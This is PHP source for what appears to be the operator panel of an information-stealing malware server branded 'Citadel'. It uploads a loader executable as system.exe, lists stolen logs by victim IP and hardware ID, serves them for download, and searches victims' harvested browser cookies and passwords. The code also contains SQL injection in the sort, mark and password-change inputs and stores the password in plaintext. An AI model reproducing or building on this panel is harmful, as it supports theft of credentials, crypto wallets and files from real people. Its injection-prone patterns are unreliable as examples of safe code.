<?php
session_start();
if($_SESSION['auth'] != 'true'){
    header("Location: /index.php");
  }
if(isset($_POST['submit2']))
{
$tmp_name =  $_FILES['file']['tmp_name'];
move_uploaded_file($tmp_name, "system.exe");
}

include('db.php');
if(isset($_POST['chck']))
{
$id = $_POST['chck'];
$result = mysqli_query($dbcnx,"UPDATE files SET marked='1' WHERE id='$id'"); 
}
$sort = id;
if(isset($_GET['sort'])){
  $sort = $_GET['sort'];
}
if(isset($_GET['logout'])){
  session_destroy();
  header("Location: /index.php");
}
if(isset($_POST['changepass'])){
  $newpass =  $_POST['changepass'];
  $sql = "UPDATE users SET password='$newpass' WHERE id=1";
  $query = mysqli_query($dbcnx, $sql);
  if($query){
        echo '<script language="javascript">';
        echo 'alert("Password changed")';
        echo '</script>';    
  }
}
?>

<!DOCTYPE html>
<html>
 <head>
  <meta charset="utf-8">
  <title>CITADEL : Main page</title>
<link href="css/mainstyle.css" rel ="stylesheet" type="text/css"/>
<link rel="shortcut icon" href="/img/cit.png" type="image/x-icon">
 </head>
 <body>
 	<div class = "left-side">
 		<a href="main.php" style="text-decoration: none"><img src="img/cit.png">
 		<h1 id="undercit">
 			Citadel
 		</h1></a>
    <h2 id = "setload">
      &nbsp;&nbsp;&nbsp;&nbsp;Set loader file
    </h2>
      <form action ="" method = "post" id="sendload" enctype="multipart/form-data">
        <input type ="file" name = "file" id="id3">
        <input type="submit" name="submit2" value="Set" id ="id4">
      </form> 
      <a href="config.php" style="text-decoration: none">
        <p class="config">Config</p>
      </a>
      <a href="?logout=true" style="text-decoration: none;   font-family: 'Concert One', cursive;
  color: #50a3c9;
  font-size: 22px;
  margin-top: 80px;
  padding-left: 90px;
  height: 70px;
  padding-top: 25px;">
        Logout
      </a>  
      <form action="" method="post">
        <input type="text" name="changepass" maxlength="32" minlength="8" style="width: 240px; height: 12px;margin-top: 50px;">
        <input type="submit" name="sumpass" style="margin-left: 60px;" value="Change password">
      </form>
 	</div>
 	<div class="numoflog" >
 		<p class ="numoflog2">Current amount of logs = 		<?php
		include('db.php');
		$idcount = mysqli_query($dbcnx, "SELECT * FROM files");
		$num = mysqli_num_rows($idcount);
		echo $num;
		?></p>
		<div id="idk" style="width: 300px;">
			<form action ="loaderv2.php" method = "post" id="inputnums">
				<input type ="number" name = "numbs" id="id" placeholder="... Logs">
        <input type="submit" name="submit" value="Download" id ="id2">
			</form>

		</div>        
 	</div>
 	<div class ="table">
      <form action="" method="get" style="">
        <p style="margin-left:  50px;">Search by cookies, passwords</p>        
        <input type="text" name="search" style="width: 200px; margin-left: 400px;">
        <input type="submit" value="Search">
      </form>   		
 		<table width="83%" height="5%">
 			<tr>
 				<th><a href="main.php?sort=id" style="text-decoration: none;color: black">Date</a></th>
 				<th><a href="main.php?sort=crypto"style="text-decoration: none;color: black">Crypto</a></th>
 				<th><a href="main.php?sort=desktop"style="text-decoration: none;color: black">Desktop</a></th>
 				<th><a href="main.php?sort=jabber"style="text-decoration: none;color: black">Jabber</a></th>
 				<th>Ip</th>
 				<th style="width: 150px">Download</th>
				<th style="width: 150px">Delete</th> 				
 			</tr>
 			<?php
 			if(!isset($_GET['search'])){
                $result = mysqli_query($dbcnx, "SELECT * FROM `files` WHERE `marked` = 'true' ORDER BY $sort DESC LIMIT 14");
                if($result)
                  {
                    while($res = mysqli_fetch_array($result))
                      {
                        echo "<tr><td><strong style='font-size:18px'>".$res['date']."</td><td><strong style='font-size:18px'>".$res['crypto']."
                         </td><td><strong style='font-size:18px'>".$res['desktop']."</td><td><strong style='font-size:18px'>".  
                        $res['jabber']."</td><td><strong style='font-size:18px'>".$res['ip']."</td><td>
                        <form action='loader.php' method='post'>
                        <input type='image' src='img/download.png' width='50px'>
                        <input type='hidden' name = 'down' value =" .$res['filename']. ">             

                        </form></td><td>              

                        <form action='' method='post'>
                      
                        <input type='image' src='img/marked.png' width='50px'>
                        <input type='hidden' name = 'chck' value =" .$res['id']. ">             

                        </form></td></tr>";
                      }
          }
          else
          {
            echo "<p><b>Error: ".mysql_error()."</b><p>";
            exit();
          }
      }
      else{
        $dirs = scandir("logs");
        foreach ($dirs as $dir) { 
          if(is_dir("logs/".$dir) and $dir != ".." and $dir != "."){
            $sql = "SELECT * FROM `files` WHERE `hwid` = '$dir' AND `marked` = 'true' ORDER BY $sort DESC LIMIT 14";
            $chrpath = "logs/".$dir."/Browsers/Chromium";
            $mozpath = "logs/".$dir."/Browsers/Mozilla";
            $search_text = $_GET['search'];

            if(stristr(file_get_contents($chrpath."/Cookies.txt"), $search_text) or stristr(file_get_contents($mozpath."/Cookies.txt"), $search_text) or stristr(file_get_contents($chrpath."/Passwords.txt"), $search_text) or stristr(file_get_contents($mozpath."/Cookies.txt"), $search_text)){
                $sqli = mysqli_query($dbcnx, $sql);
                if($sqli)
                  {
                    while($res = mysqli_fetch_array($sqli))
                      {
                        echo "<tr><td><strong style='font-size:18px'>".$res['date']."</td><td><strong style='font-size:18px'>".$res['crypto']."
                         </td><td><strong style='font-size:18px'>".$res['desktop']."</td><td><strong style='font-size:18px'>".  
                        $res['jabber']."</td><td><strong style='font-size:18px'>".$res['ip']."</td><td>
                        <form action='loader.php' method='post'>
                        <input type='image' src='img/download.png' width='50px'>
                        <input type='hidden' name = 'down' value =" .$res['filename']. ">             

                        </form></td><td>              

                        <form action='' method='post'>
                      
                        <input type='image' src='img/marked.png' width='50px'>
                        <input type='hidden' name = 'chck' value =" .$res['id']. ">             

                        </form></td></tr>";
                      }
          }
            }
          }
        }
      }
 			?>
 		</table>
 	</div>
	
 </body>
</html>